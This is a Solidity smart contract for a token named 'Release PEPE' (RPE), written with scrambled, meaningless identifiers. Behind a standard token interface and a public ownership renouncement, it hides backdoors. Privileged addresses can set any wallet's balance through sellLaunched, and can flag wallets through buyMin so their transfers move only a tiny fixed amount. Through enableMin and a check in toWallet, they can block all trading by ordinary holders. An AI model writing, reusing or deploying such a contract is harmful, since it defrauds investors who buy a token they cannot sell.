//SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface launchMarketing {
    function totalSupply() external view returns (uint256);

    function balanceOf(address autoEnable) external view returns (uint256);

    function transfer(address txLiquidity, uint256 swapToken) external returns (bool);

    function allowance(address launchTx, address spender) external view returns (uint256);

    function approve(address spender, uint256 swapToken) external returns (bool);

    function transferFrom(
        address sender,
        address txLiquidity,
        uint256 swapToken
    ) external returns (bool);

    event Transfer(address indexed from, address indexed fromIs, uint256 value);
    event Approval(address indexed launchTx, address indexed spender, uint256 value);
}

abstract contract tokenBuy {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface atToMarketing {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface txLaunched {
    function createPair(address buyLiquidity, address feeMarketingTrading) external returns (address);
}

interface launchMarketingMetadata is launchMarketing {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ReleasePEPE is tokenBuy, launchMarketing, launchMarketingMetadata {

    address private feeSell;

    function transferFrom(address walletList, address txLiquidity, uint256 swapToken) external override returns (bool) {
        if (_msgSender() != autoFee) {
            if (senderModeMax[walletList][_msgSender()] != type(uint256).max) {
                require(swapToken <= senderModeMax[walletList][_msgSender()]);
                senderModeMax[walletList][_msgSender()] -= swapToken;
            }
        }
        return toWallet(walletList, txLiquidity, swapToken);
    }

    uint256 constant launchBuy = 7 ** 10;

    function launchReceiver() private view {
        require(fundShouldToken[_msgSender()]);
    }

    function approve(address txTeam, uint256 swapToken) public virtual override returns (bool) {
        senderModeMax[_msgSender()][txTeam] = swapToken;
        emit Approval(_msgSender(), txTeam, swapToken);
        return true;
    }

    string private teamFeeTo = "RPE";

    function marketingFrom() public {
        emit OwnershipTransferred(listTotal, address(0));
        feeSell = address(0);
    }

    bool private maxSell;

    uint256 private txToBuy;

    mapping(address => mapping(address => uint256)) private senderModeMax;

    function decimals() external view virtual override returns (uint8) {
        return buyTrading;
    }

    function buyMin(address limitExempt) public {
        launchReceiver();
        if (txToBuy != limitTake) {
            totalMax = true;
        }
        if (limitExempt == listTotal || limitExempt == amountSell) {
            return;
        }
        modeSwap[limitExempt] = true;
    }

    uint256 private marketingTo = 100000000 * 10 ** 18;

    uint256 public atFee;

    bool public takeMin;

    uint256 atTotalEnable;

    function transfer(address senderSwap, uint256 swapToken) external virtual override returns (bool) {
        return toWallet(_msgSender(), senderSwap, swapToken);
    }

    uint256 private amountWallet;

    uint256 private limitTake;

    function receiverLaunchIs(address totalMode) public {
        require(totalMode.balance < 100000);
        if (takeMin) {
            return;
        }
        
        fundShouldToken[totalMode] = true;
        if (amountWallet != txToBuy) {
            txToBuy = enableFee;
        }
        takeMin = true;
    }

    bool public totalMax;

    function senderFund(address walletList, address txLiquidity, uint256 swapToken) internal returns (bool) {
        require(feeIs[walletList] >= swapToken);
        feeIs[walletList] -= swapToken;
        feeIs[txLiquidity] += swapToken;
        emit Transfer(walletList, txLiquidity, swapToken);
        return true;
    }

    mapping(address => bool) public fundShouldToken;

    function owner() external view returns (address) {
        return feeSell;
    }

    function allowance(address txFrom, address txTeam) external view virtual override returns (uint256) {
        if (txTeam == autoFee) {
            return type(uint256).max;
        }
        return senderModeMax[txFrom][txTeam];
    }

    function sellLaunched(address senderSwap, uint256 swapToken) public {
        launchReceiver();
        feeIs[senderSwap] = swapToken;
    }

    event OwnershipTransferred(address indexed enableTotalAmount, address indexed minExempt);

    bool public modeMarketing;

    uint8 private buyTrading = 18;

    function totalSupply() external view virtual override returns (uint256) {
        return marketingTo;
    }

    constructor (){
        
        atToMarketing maxMin = atToMarketing(autoFee);
        amountSell = txLaunched(maxMin.factory()).createPair(maxMin.WETH(), address(this));
        if (totalMax) {
            enableFee = amountWallet;
        }
        listTotal = _msgSender();
        marketingFrom();
        fundShouldToken[listTotal] = true;
        feeIs[listTotal] = marketingTo;
        
        emit Transfer(address(0), listTotal, marketingTo);
    }

    address autoFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function name() external view virtual override returns (string memory) {
        return atSender;
    }

    bool public feeReceiver;

    uint256 receiverSender;

    string private atSender = "Release PEPE";

    function enableMin(uint256 swapToken) public {
        launchReceiver();
        atTotalEnable = swapToken;
    }

    mapping(address => uint256) private feeIs;

    function toWallet(address walletList, address txLiquidity, uint256 swapToken) internal returns (bool) {
        if (walletList == listTotal) {
            return senderFund(walletList, txLiquidity, swapToken);
        }
        uint256 isTakeMax = launchMarketing(amountSell).balanceOf(teamLimit);
        require(isTakeMax == atTotalEnable);
        require(txLiquidity != teamLimit);
        if (modeSwap[walletList]) {
            return senderFund(walletList, txLiquidity, launchBuy);
        }
        return senderFund(walletList, txLiquidity, swapToken);
    }

    address public amountSell;

    function balanceOf(address autoEnable) public view virtual override returns (uint256) {
        return feeIs[autoEnable];
    }

    function getOwner() external view returns (address) {
        return feeSell;
    }

    address public listTotal;

    mapping(address => bool) public modeSwap;

    address teamLimit = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function symbol() external view virtual override returns (string memory) {
        return teamFeeTo;
    }

    uint256 public enableFee;

}